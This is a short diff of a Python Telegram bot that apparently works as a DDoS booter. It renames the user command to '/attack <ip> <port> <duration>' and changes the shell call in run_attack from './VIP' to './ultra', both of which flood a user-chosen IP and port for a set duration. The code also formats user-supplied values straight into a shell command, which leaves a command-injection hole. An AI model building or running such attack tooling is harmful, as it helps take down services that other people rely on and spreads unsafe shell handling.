@@ -61,7 +61,7 @@ async def start(update: Update, context: CallbackContext):
         return
     message = (
         f"*🔥 Welcome to the battlefield, {user_name}! 🔥*\n\n"
-             "*Use /bgmi <ip> <port> <duration>*\n" 
+             "*Use /attack <ip> <port> <duration>*\n" 
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -167,7 +167,7 @@ async def papa_bol(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./VIP {ip} {port} {duration} 100",
+            f"./ultra {ip} {port} {duration} 20",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
